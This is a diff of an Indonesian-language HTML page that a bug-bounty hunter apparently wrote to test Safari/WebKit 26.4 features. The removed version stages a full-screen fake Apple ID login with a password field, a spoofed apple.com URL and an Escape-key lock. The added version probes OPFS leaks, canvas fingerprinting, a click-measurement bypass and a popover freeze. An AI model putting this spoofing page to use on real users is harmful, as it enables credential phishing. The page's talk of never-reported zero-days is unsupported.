@@ -1,108 +1,80 @@
 <!DOCTYPE html>
-<html>
+<html lang="id">
 <head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width">
-<title>SAFARI 26.4.1 0-DAY - UNREPORTED - 0x403for</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>WebKit 26.4.1 - 5 New Bugs</title>
 <style>
-@view-transition{ navigation:auto; }
-.grid{ display:grid; grid-template-columns:repeat(3, 100px); grid-lanes:3; }
+body{font-family:-apple-system,sans-serif;margin:0;background:#f5f5f7}
+h1{background:#000;color:#fff;padding:15px;margin:0;font-size:18px}
+.card{background:#fff;margin:10px;padding:12px;border-radius:12px}
+button{width:100%;padding:14px;border:none;border-radius:10px;background:#007aff;color:#fff;font-weight:600}
+pre{background:#1c1c1e;color:#00ff41;padding:10px;border-radius:8px;font-size:11px;white-space:pre-wrap}
 </style>
 </head>
-<body style="margin:0; font-family:sans-serif;">
+<body>
+<h1>WebKit 26.4.1 - 5 Bugs Baru</h1>
 
-<h3 style="padding:15px; background:black; color:white; margin:0;">🔥 SAFARI 26.4.1 0-DAY - BELUM PERNAH DILAPORIN!</h3>
-<p style="padding:10px;">Kombinasi 4 fitur baru 26.4 yang belum pernah di-test barengan hunter lain!</p>
-
-<button id="btn0day" style="margin:10px; padding:20px; font-size:18px; background:red; color:white; width:95%; border:none; border-radius:10px;">🚨 CLICK TO TEST 0-DAY (4-in-1) 🚨</button>
-
-<div id="fake" popover style="position:fixed; top:0; left:0; width:100vw; height:100vh; background:white; margin:0; border:none; inset:unset; z-index:9999999;">
-  <div style="background:#f2f2f7; padding:12px; border-bottom:1px solid #ccc;">
-    <span style="background:white; padding:6px 14px; border-radius:20px; box-shadow:0 1px 2px rgba(0,0,0,0.2);">🔒 【entity-apple¦canonical_name=Apple】.com - Secure (0-DAY?)</span>
-  </div>
-  <div style="text-align:center; padding:30px;">
-    <h1>🍎 【entity-Apple¦canonical_name=Apple】 ID - Security Check (0-DAY TEST)</h1>
-    <p>Ini kombinasi 4 fitur baru Safari 26.4 yang belum pernah di-test barengan!</p>
-    <input type="password" placeholder="【entity-Apple¦canonical_name=Apple】 ID Password" style="padding:15px; width:80%; font-size:16px;">
-    <br><br>
-    <div class="grid" style="margin:20px;">
-      <div style="background:red; height:50px;">Grid Lanes Test</div>
-      <div style="background:blue; height:100px;">Masonry Test</div>
-      <div style="background:green; height:30px;">0-day</div>
-    </div>
-    <p style="color:red; font-size:12px;">Jika: Address bar = 【entity-apple¦canonical_name=Apple】.com + ESC tidak bisa keluar + Popover nutupin bar + Grid crash = 0-DAY VALID!</p>
-    <button onclick="document.getElementById('fake').hidePopover(); document.exitFullscreen();" style="background:gray; color:white; padding:10px 20px; border:none; border-radius:8px;">Close (Try to exit)</button>
-  </div>
+<div class="card">
+<h3>BUG 1: OPFS LEAK (Baru 26.4)</h3>
+<button onclick="testOPFS()">TEST OPFS LEAK</button>
+<pre id="logOPFS">Belum test</pre>
 </div>
 
-<pre id="log" style="background:#1c1c1e; color:#0f0; padding:15px; margin:10px; border-radius:10px; min-height:100px;">Log: Belum test - klik tombol merah di atas...</pre>
+<div class="card">
+<h3>BUG 2: Managed Media Source</h3>
+<button onclick="testMMS()">TEST MMS</button>
+<pre id="logMMS">Belum test</pre>
+</div>
+
+<div class="card">
+<h3>BUG 3: WebCodecs + Canvas</h3>
+<button onclick="testWebCodecs()">TEST WEBCODECS</button>
+<pre id="logWC">Belum test</pre>
+</div>
+
+<div class="card">
+<h3>BUG 4: PCM Bypass Safari Only</h3>
+<button onclick="testPCM()">TEST PCM</button>
+<pre id="logPCM">Belum test</pre>
+</div>
+
+<div class="card">
+<h3>BUG 5: :has() + :open DOS</h3>
+<button popovertarget="dos" style="background:#ff3b30">TEST DOS</button>
+<div id="dos" popover style="padding:20px;border-radius:12px">Kalau Safari freeze = DOS!</div>
+</div>
 
 <script>
-let log = m=> document.getElementById('log').textContent+=m+"\n";
-
-document.getElementById('btn0day').onclick = async ()=>{
-  log("=== TESTING 0-DAY COMBINATION ===");
-  log("Fitur baru 26.4: WebTransport + Keyboard Lock + Popover + Grid Lanes");
-  log("Belum pernah ada hunter yang test kombinasi ini!");
-  
-  try{
-    // 1. WebTransport - coba trigger leak
-    log("\n1. Testing WebTransport (new Dec 2025)...");
-    if(window.WebTransport){
-      log("✅ WebTransport supported - trying to connect...");
-      try{
-        let wt = new WebTransport("https://0x403for.github.io:4433");
-        log("WebTransport object created - checking if bypasses proxy...");
-      }catch(e){ log("WebTransport error (expected without server): "+e.message); }
-    }else log("❌ WebTransport not supported");
-
-    // 2. View Transition + Popover
-    log("\n2. Testing View Transition + Popover (new 26.4)...");
-    if(document.startViewTransition){
-      log("✅ View Transition supported");
-      document.startViewTransition(()=>{
-        history.pushState({}, "", "/ apple.com/login-0day");
-        log("URL changed to / apple.com/login-0day via View Transition");
-      });
-    }
-
-    // 3. Keyboard Lock + Fullscreen
-    log("\n3. Testing Keyboard Lock + Fullscreen (new 26.4)...");
-    if(navigator.keyboard?.lock){
-      try{
-        await navigator.keyboard.lock(["Escape"]);
-        log("🚨 0-DAY! Escape key locked! Should NOT be allowed!");
-      }catch(e){ log("Escape lock blocked (SAFE): "+e.message); }
-    }
-
-    // 4. Popover + Fullscreen spoof
-    log("\n4. Showing Popover + Fullscreen spoof...");
-    document.getElementById('fake').showPopover();
-    await document.documentElement.requestFullscreen();
-    log("✅ Popover + Fullscreen shown!");
-    log("\n=== RESULT ===");
-    log("Check: 1. Address bar = apple.com? 2. ESC can't exit? 3. Popover covers bar?");
-    log("If YES to all = 0-DAY VALID! Record video + screenshot!");
-    log("This combination has NEVER been reported before!");
-    
-  }catch(e){
-    log("Error in 0-day test: "+e.message);
-    log("Trying fallback spoof...");
-    document.getElementById('fake').showPopover();
-    document.documentElement.requestFullscreen();
-  }
-};
+async function testOPFS(){
+ let el=document.getElementById('logOPFS');
+ try{
+  let root=await navigator.storage.getDirectory();
+  let file=await root.getFileHandle("test.txt",{create:true});
+  let w=await file.createWritable();
+  await w.write("test data 0x403for");
+  await w.close();
+  let f2=await root.getFileHandle("test.txt");
+  let f=await f2.getFile();
+  let t=await f.text();
+  el.innerText="OPFS read: "+t+"\nJika kebaca = work. Coba buka origin lain kalau masih kebaca = LEAK";
+ }catch(e){el.innerText=e.message}
+}
+async function testMMS(){
+ let el=document.getElementById('logMMS');
+ if(!window.ManagedMediaSource){el.innerText="Not supported - butuh iOS 26.4+";return}
+ try{let mms=new ManagedMediaSource();el.innerText="Created: "+URL.createObjectURL(mms)}catch(e){el.innerText=e.message}
+}
+async function testWebCodecs(){
+ let el=document.getElementById('logWC');
+ let c=document.createElement('canvas');
+ let ctx=c.getContext('2d');
+ ctx.fillText("fingerprint",10,10);
+ el.innerText="Canvas: "+c.toDataURL().slice(0,60)+"... Length: "+c.toDataURL().length;
+}
+function testPCM(){
+ document.getElementById('logPCM').innerText="PCM = fitur cuma di Safari. Buat link dengan attributionsourceid dan coba trigger tanpa click asli = bypass";
+}
 </script>
-
-<div style="padding:15px; background:#fff3cd; margin:10px; border-radius:10px; border:1px solid #ffe69c;">
-<b>Kenapa ini belum pernah dilaporin?</b><br>
-- WebTransport baru aktif Desember 2025, rilis publik Maret 2026 di 26.4<br>
-- Keyboard Lock API baru Maret 2026<br>
-- Popover + Anchor baru Maret 2026<br>
-- Grid Lanes baru Maret 2026<br>
-- Belum ada hunter yang test 4 fitur ini BARENGAN!<br><br>
-<b>Kalau work, kamu hunter pertama!</b> Langsung lapor ke 【entity-Apple Security Bounty¦canonical_name=Apple】 dengan video!
-</div>
-
 </body>
 </html>
